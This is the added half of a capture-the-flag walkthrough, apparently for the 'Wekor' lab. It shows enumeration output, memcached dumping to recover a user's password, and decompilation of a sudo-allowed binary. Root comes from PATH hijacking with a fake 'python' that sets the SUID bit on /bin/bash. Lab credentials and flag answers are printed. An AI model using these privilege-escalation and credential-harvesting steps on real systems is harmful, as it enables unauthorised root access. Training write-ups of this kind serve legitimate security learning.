@@ -1380,3 +1380,695 @@ uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
 uid=41(gnats) gid=41(gnats) groups=41(gnats)
 uid=5(games) gid=60(games) groups=60(games)
 uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+╔══════════╣ Login now
+ 13:48:34 up  1:39,  0 users,  load average: 3.06, 2.62, 2.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+╔══════════╣ Last logons
+
+wtmp begins Mon Mar 13 12:15:38 2023
+
+╔══════════╣ Last time logon each user
+Username         Port     From             Latest
+root             pts/18   192.168.0.1      Sun Jul 12 19:55:38 -0400 2020
+
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+                             ╔══════════════════════╗
+═════════════════════════════╣ Software Information ╠═════════════════════════════
+                             ╚══════════════════════╝
+╔══════════╣ Useful software
+/usr/bin/base64
+/usr/bin/g++
+/usr/bin/gcc
+/usr/bin/gdb
+/usr/bin/make
+/bin/nc
+/bin/netcat
+/usr/bin/perl
+/usr/bin/php
+/bin/ping
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python2.7
+/usr/bin/python3
+/usr/bin/sudo
+/usr/bin/wget
+/usr/bin/xterm
+
+╔══════════╣ Installed Compilers
+ii  g++                                       4:5.3.1-1ubuntu1                                i386         GNU C++ compiler
+ii  g++-5                                     5.4.0-6ubuntu1~16.04.12                         i386         GNU C++ compiler
+ii  gcc                                       4:5.3.1-1ubuntu1                                i386         GNU C compiler
+ii  gcc-5                                     5.4.0-6ubuntu1~16.04.12                         i386         GNU C compiler
+ii  hardening-includes                        2.7ubuntu2                                      all          Makefile for enabling compiler flags for security hardening
+/usr/bin/gcc
+
+╔══════════╣ MySQL version
+mysql  Ver 14.14 Distrib 5.7.32, for Linux (i686) using  EditLine wrapper
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No
+═╣ MySQL connection using root/NOPASS ................. No
+
+╔══════════╣ Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+╔══════════╣ Analyzing MariaDB Files (limit 70)
+
+-rw------- 1 root root 317 Jan 20  2021 /etc/mysql/debian.cnf
+
+╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
+Apache version: Server version: Apache/2.4.18 (Ubuntu)
+Server built:   2020-08-12T21:35:50
+httpd Not Found
+
+Nginx version: nginx Not Found
+
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
+══╣ PHP exec extensions
+drwxr-xr-x 2 root root 4096 Jan 19  2021 /etc/apache2/sites-enabled
+drwxr-xr-x 2 root root 4096 Jan 19  2021 /etc/apache2/sites-enabled
+lrwxrwxrwx 1 root root 39 Jul 12  2020 /etc/apache2/sites-enabled/site.chaser.htb.conf -> ../sites-available/site.chaser.htb.conf
+lrwxrwxrwx 1 root root 38 Jan 19  2021 /etc/apache2/sites-enabled/site.wekor.thm.conf -> ../sites-available/site.wekor.thm.conf
+<VirtualHost *:80>
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html/site.wekor.thm/
+	ServerName site.wekor.thm
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Jul 12  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+-rw-r--r-- 1 root root 1332 Jun 15  2020 /etc/apache2/sites-available/000-default.conf
+<VirtualHost *:80>
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Jul 12  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+-rw-r--r-- 1 root root 70999 May 26  2020 /etc/php/7.0/apache2/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+ibase.allow_persistent = 1
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+-rw-r--r-- 1 root root 70656 May 26  2020 /etc/php/7.0/cli/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+ibase.allow_persistent = 1
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-rw-rw- 1 www-data www-data 3192 Jan 21  2021 /var/www/html/site.wekor.thm/wordpress/wp-config.php
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'root' );
+define( 'DB_PASSWORD', 'root123@#59' );
+define( 'DB_HOST', 'localhost' );
+
+╔══════════╣ Analyzing Rsync Files (limit 70)
+-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
+[ftp]
+	comment = public archive
+	path = /var/www/pub
+	use chroot = yes
+	lock file = /var/lock/rsyncd
+	read only = yes
+	list = yes
+	uid = nobody
+	gid = nogroup
+	strict modes = yes
+	ignore errors = no
+	ignore nonreadable = yes
+	transfer logging = no
+	timeout = 600
+	refuse options = checksum dry-run
+	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+╔══════════╣ Analyzing Wifi Connections Files (limit 70)
+drwxr-xr-x 2 root root 4096 Nov  2  2018 /etc/NetworkManager/system-connections
+drwxr-xr-x 2 root root 4096 Nov  2  2018 /etc/NetworkManager/system-connections
+
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'
+drwxr-xr-x 2 root root 4096 Jan 20  2021 /etc/ldap
+
+╔══════════╣ Searching ssl/ssh files
+Port 22
+PermitRootLogin yes
+PubkeyAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+UsePAM yes
+
+══╣ Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+
+══╣ Some home ssh config file was found
+/usr/share/doc/openssh-client/examples/sshd_config
+AuthorizedKeysFile	.ssh/authorized_keys
+Subsystem	sftp	/usr/lib/openssh/sftp-server
+
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials no
+
+╔══════════╣ Analyzing PAM Auth Files (limit 70)
+drwxr-xr-x 2 root root 4096 Jan 23  2021 /etc/pam.d
+-rw-r--r-- 1 root root 2133 May 26  2020 /etc/pam.d/sshd
+
+╔══════════╣ Passwords inside pam.d
+/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin
+
+╔══════════╣ Analyzing Keyring Files (limit 70)
+drwxr-xr-x 2 root root 4096 Feb 26  2019 /usr/share/keyrings
+drwxr-xr-x 2 root root 4096 Feb 26  2019 /var/lib/apt/keyrings
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+
+╔══════════╣ Analyzing PGP-GPG Files (limit 70)
+/usr/bin/gpg
+gpg Not Found
+netpgpkeys Not Found
+netpgp Not Found
+
+-rw-r--r-- 1 root root 12255 Feb 26  2019 /etc/apt/trusted.gpg
+-rw-r--r-- 1 root root 4114 Jun 14  2018 /usr/share/gnupg2/distsigkey.gpg
+-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
+-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
+-rw-r--r-- 1 root root 2253 Nov  5  2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
+-rw-r--r-- 1 root root 1139 Nov  5  2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
+-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
+-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
+-rw-r--r-- 1 root root 12335 Feb 26  2019 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg
+
+╔══════════╣ Analyzing Postfix Files (limit 70)
+-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix
+
+╔══════════╣ Analyzing FTP Files (limit 70)
+
+-rw-r--r-- 1 root root 69 May 26  2020 /etc/php/7.0/mods-available/ftp.ini
+-rw-r--r-- 1 root root 69 Oct  8  2020 /usr/share/php7.0-common/common/ftp.ini
+
+╔══════════╣ Analyzing Windows Files (limit 70)
+
+lrwxrwxrwx 1 root root 20 Jul 12  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
+lrwxrwxrwx 1 root root 24 Jul 12  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
+-rw-r--r-- 1 root root 81 Jan 20  2021 /var/lib/dpkg/alternatives/my.cnf
+
+-rw-r--r-- 1 root root 553164 Feb 18  2016 /usr/share/gutenprint/5.2/xml/printers.xml
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
+
+-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
+                               ╚═══════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root root 43K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 39K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 26K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 30K Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 34K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 38K May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 119K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root messagebus 46K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 14K Mar 18  2017 /usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
+-rwsr-xr-x 1 root root 5.4K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-sr-x 1 root root 9.6K Nov 30  2020 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-x 1 root root 502K May 26  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root dip 387K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root shadow 38K Apr  9  2018 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 38K Apr  9  2018 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root mail 14K Jul  8  2020 /usr/lib/evolution/camel-lock-helper-1.2
+-rwxr-sr-x 1 root utmp 5.4K Mar 11  2016 /usr/lib/i386-linux-gnu/utempter/utempter
+-rwsr-sr-x 1 root root 9.6K Nov 30  2020 /usr/lib/xorg/Xorg.wrap
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/fakeroot-i386-linux-gnu.conf
+/usr/lib/i386-linux-gnu/libfakeroot
+  /etc/ld.so.conf.d/i386-linux-gnu.conf
+/lib/i386-linux-gnu
+/usr/lib/i386-linux-gnu
+/lib/i686-linux-gnu
+/usr/lib/i686-linux-gnu
+  /etc/ld.so.conf.d/i386-linux-gnu_EGL.conf
+/usr/lib/i386-linux-gnu/mesa-egl
+  /etc/ld.so.conf.d/i386-linux-gnu_GL.conf
+/usr/lib/i386-linux-gnu/mesa
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current env capabilities:
+Current: =
+Current proc capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+
+www-data@osboxes:/home$ ls
+ls
+Orka  lost+found
+www-data@osboxes:/home$ cd lost+found
+cd lost+found
+bash: cd: lost+found: Permission denied
+www-data@osboxes:/home$ cd Orka
+cd Orka
+bash: cd: Orka: Permission denied
+
+www-data@osboxes:/home$ netstat -tulpn
+netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:51182           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
+udp6       0      0 :::5353                 :::*                                -               
+udp6       0      0 :::44294                :::*                                -  
+
+https://book.hacktricks.xyz/network-services-pentesting/11211-memcache
+
+https://lzone.de/cheat-sheet/memcached
+
+https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+
+www-data@osboxes:/home$ telnet localhost 11211
+telnet localhost 11211
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+stats items
+stats items
+STAT items:1:number 5
+STAT items:1:age 7564
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 0
+STAT items:1:lrutail_reflocked 0
+END
+stats cachedump 1 0
+stats cachedump 1 0
+ITEM id [4 b; 1678723792 s]
+ITEM email [14 b; 1678723792 s]
+ITEM salary [8 b; 1678723792 s]
+ITEM password [15 b; 1678723792 s]
+ITEM username [4 b; 1678723792 s]
+END
+get username
+get username
+VALUE username 0 4
+Orka
+END
+get password
+get password
+VALUE password 0 15
+OrkAiSC00L24/7$
+
+Orka: OrkAiSC00L24/7$
+
+another way
+
+www-data@osboxes:/usr/share/memcached/scripts$ ./memcached-tool localhost:11211 dump
+</memcached/scripts$ ./memcached-tool localhost:11211 dump                   
+Dumping memcache contents
+  Number of buckets: 1
+  Number of items  : 5
+Dumping bucket 1 - 5 total items
+add salary 0 1678723792 8
+$100,000
+add email 0 1678723792 14
+Orka@wekor.thm
+add id 0 1678723792 4
+3476
+add password 0 1678723792 15
+OrkAiSC00L24/7$
+add username 0 1678723792 4
+Orka
+
+www-data@osboxes:/home$ su Orka
+su Orka
+Password: OrkAiSC00L24/7$
+
+Orka@osboxes:/home$ ls
+ls
+lost+found  Orka
+Orka@osboxes:/home$ cd Orka
+cd Orka
+Orka@osboxes:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+Orka@osboxes:~$ cat user.txt
+cat user.txt
+1a26a6d51c0172400add0e297608dec6
+
+Orka@osboxes:~$ sudo -l
+sudo -l
+[sudo] password for Orka: OrkAiSC00L24/7$
+
+Matching Defaults entries for Orka on osboxes:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User Orka may run the following commands on osboxes:
+    (root) /home/Orka/Desktop/bitcoin
+Orka@osboxes:~$ cd Desktop
+cd Desktop
+Orka@osboxes:~/Desktop$ ls
+ls
+bitcoin  transfer.py
+
+Orka@osboxes:~/Desktop$ cat transfer.py
+cat transfer.py
+import time
+import socket
+import sys
+import os
+
+result = sys.argv[1]
+
+print "Saving " + result + " BitCoin(s) For Later Use "
+
+test = raw_input("Do you want to make a transfer? Y/N : ")
+
+if test == "Y":
+	try:
+		print "Transfering " + result + " BitCoin(s) "
+		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		connect = s.connect(("127.0.0.1",3010))
+		s.send("Transfer : " + result + "To https://transfer.bitcoins.com")
+		time.sleep(2.5)
+		print ("Transfer Completed Successfully...")
+		time.sleep(1)
+		s.close()
+	except:
+		print("Error!")
+else:
+	print("Quitting...")
+	time.sleep(1)
+
+Orka@osboxes:~/Desktop$ file bitcoin
+file bitcoin
+bitcoin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped
+Orka@osboxes:~/Desktop$ ls -l
+ls -l
+total 12
+-rwxr-xr-x 1 root root 7696 Jan 23  2021 bitcoin
+-rwxr--r-- 1 root root  588 Jan 23  2021 transfer.py
+
+Orka@osboxes:~/Desktop$ python3 -m http.server 1234
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.101.47:1234/bitcoin
+--  http://10.10.101.47:1234/bitcoin
+Connecting to 10.10.101.47:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7696 (7.5K) [application/octet-stream]
+Saving to: ‘bitcoin’
+
+bitcoin      100%   7.52K  --.-KB/s    in 0s      
+
+(311 MB/s) - ‘bitcoin’ saved [7696/7696]
+
+using ghidra
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ghidra bitcoin 
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+
+decompiled main
+
+undefined4 main(void)
+
+{
+  int iVar1;
+  ushort **ppuVar2;
+  int in_GS_OFFSET;
+  char local_88;
+  char local_87 [15];
+  char local_78 [100];
+  int local_14;
+  undefined *local_c;
+  
+  local_c = &stack0x00000004;
+  local_14 = *(int *)(in_GS_OFFSET + 0x14);
+  printf("Enter the password : ");
+  gets(local_87);
+  iVar1 = strcmp(local_87,"password");
+  if (iVar1 == 0) {
+    puts("Access Granted...");
+    sleep(1);
+    puts("\t\t\tUser Manual:\t\t\t");
+    puts("Maximum Amount Of BitCoins Possible To Transfer at a time : 9 ");
+    puts("Amounts with more than one number will be stripped off! ");
+    puts("And Lastly, be careful, everything is logged :) ");
+    printf("Amount Of BitCoins : ");
+    __isoc99_scanf(&DAT_0804893b,&local_88);
+    ppuVar2 = __ctype_b_loc();
+    if (((*ppuVar2)[local_88] & 0x800) == 0) {
+      puts("\n Sorry, This is not a valid amount! ");
+    }
+    else {
+      sprintf(local_78,"python /home/Orka/Desktop/transfer.py %c",(int)local_88);
+      system(local_78);
+    }
+  }
+  else {
+    puts("Access Denied... ");
+  }
+  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+
+Orka@osboxes:~/Desktop$ ./bitcoin
+                        ./bitcoin
+./bitcoin
+Enter the password : password
+                     password
+password
+Access Granted...
+			User Manual:			
+Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
+Amounts with more than one number will be stripped off! 
+And Lastly, be careful, everything is logged :) 
+Amount Of BitCoins : 9
+                     9
+9
+Saving 9 BitCoin(s) For Later Use 
+Do you want to make a transfer? Y/N : Y
+                                      Y
+Y
+Transfering 9 BitCoin(s) 
+Transfer Completed Successfully...
+
+Orka@osboxes:~/Desktop$ echo $PATH
+                        echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+Orka@osboxes:~/Desktop$ cd /usr/sbin
+
+cd /usr/sbin
+Orka@osboxes:/usr/sbin$ cat << EOF > python
+#!/bin/bash
+
+chmod +s /bin/bash
+EOF
+
+Orka@osboxes:/usr/sbin$ 
+Orka@osboxes:/usr/sbin$ cat python
+cat python
+#!/bin/bash
+
+chmod +s /bin/bash
+
+Orka@osboxes:/usr/sbin$ chmod +x python
+chmod +x python
+
+Orka@osboxes:/usr/sbin$ ls -la python
+ls -la python
+-rw-rw-r-- 1 Orka Orka 32 Mar 13 15:41 python
+
+Orka@osboxes:/usr/sbin$ sudo -u root /home/Orka/Desktop/bitcoin 
+sudo -u root /home/Orka/Desktop/bitcoin 
+
+[sudo] password for Orka: OrkAiSC00L24/7$
+
+Enter the password : password
+password
+Access Granted...
+			User Manual:			
+Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
+Amounts with more than one number will be stripped off! 
+And Lastly, be careful, everything is logged :) 
+Amount Of BitCoins : 9
+9
+Saving 9 BitCoin(s) For Later Use 
+Do you want to make a transfer? Y/N : Y
+Y
+Transfering 9 BitCoin(s) 
+Transfer Completed Successfully...
+
+Orka@osboxes:/usr/sbin$ ls -la /bin/bash
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1109564 Jul 12  2019 /bin/bash
+Orka@osboxes:/usr/sbin$ /bin/bash -p
+/bin/bash -p
+bash-4.3# whoami;id;cd /root
+whoami;id;cd /root
+root
+uid=1001(Orka) gid=1001(Orka) euid=0(root) egid=0(root) groups=0(root),1001(Orka)
+bash-4.3# ls
+ls
+cache.php  root.txt  server.py	wordpress_admin.txt
+bash-4.3# cat root.txt
+cat root.txt
+f4e788f87cc3afaecbaf0f0fe9ae6ad7
+bash-4.3# cat wordpress_admin.txt
+cat wordpress_admin.txt
+admin:krq7@Gr60jo5FOHyDL
+bash-4.3# cat cache.php
+cat cache.php
+<?php
+
+$meminstance = new Memcached();
+
+$meminstance->addServer("127.0.0.1",11211);
+
+$meminstance->set("username","Orka");
+$meminstance->set("password","OrkAiSC00L24/7$");
+$meminstance->set("salary","$100,000");
+$meminstance->set("email","Orka@wekor.thm");
+$meminstance->set("id","3476");
+bash-4.3# cat server.py
+cat server.py
+import socket
+import sys
+
+HOST = '127.0.0.1'	# Symbolic name, meaning all available interfaces
+PORT = 3010	# Arbitrary non-privileged port
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print 'Socket created'
+
+#Bind socket to local host and port
+try:
+	s.bind((HOST, PORT))
+except socket.error as msg:
+	print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+	sys.exit()
+
+print 'Socket bind complete'
+
+#Start listening on socket
+s.listen(10)
+print 'Socket now listening'
+
+#now keep talking with the client
+while 1:
+    #wait to accept a connection - blocking call
+	conn, addr = s.accept()
+	print 'Connected with ' + addr[0] + ':' + str(addr[1])
+
+s.close()
+```
+![[Pasted image 20230313112659.png]]
+What is the user flag?
+Look at what ports are open :)
+*1a26a6d51c0172400add0e297608dec6*
+What is the root flag?
+Sudo -l
+*f4e788f87cc3afaecbaf0f0fe9ae6ad7*
+
+## Notes / Lessons Learned
+[[Revenge]]
+
